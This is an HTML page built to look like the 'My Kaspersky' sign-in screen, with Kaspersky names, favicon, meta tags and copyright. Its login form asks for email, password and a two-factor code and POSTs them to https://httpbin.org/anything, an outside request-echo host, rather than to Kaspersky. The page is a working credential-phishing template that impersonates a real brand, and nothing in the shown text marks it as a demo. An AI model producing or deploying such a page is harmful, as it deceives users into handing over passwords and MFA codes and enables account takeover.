<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>My Kaspersky - Sign in to your account</title>
<link rel="icon" href="https://my.kaspersky.com/favicon.ico">
<meta property="og:site_name" content="Kaspersky">
<meta property="og:title" content="Sign in - My Kaspersky">
<meta name="application-name" content="My Kaspersky">
<meta name="author" content="AO Kaspersky Lab">
<meta name="description" content="Sign in to your Kaspersky account to manage subscriptions and devices">
<meta name="keywords" content="kaspersky, sign in, login, account, my kaspersky">
</head>
<body>
<div>
  <h1>Kaspersky</h1>
  <h2>Sign in to My Kaspersky</h2>
  <p>Enter your Kaspersky account credentials to manage your subscriptions.</p>
  <form action="https://httpbin.org/anything" method="POST" autocomplete="on">
    <label>Email <input type="email" name="username" id="username" autocomplete="username email" placeholder="Enter your email"></label><br>
    <label>Password <input type="password" name="password" id="password" autocomplete="current-password" placeholder="Enter your password"></label><br>
    <label>Two-factor code <input type="text" name="otp" id="otp" autocomplete="one-time-code" placeholder="MFA code (optional)"></label><br>
    <label><input type="checkbox" name="remember" checked> Remember me</label><br>
    <button type="submit">Sign in to My Kaspersky</button>
  </form>
  <p>&copy; 2026 AO Kaspersky Lab</p>
</div>
</body>
</html>
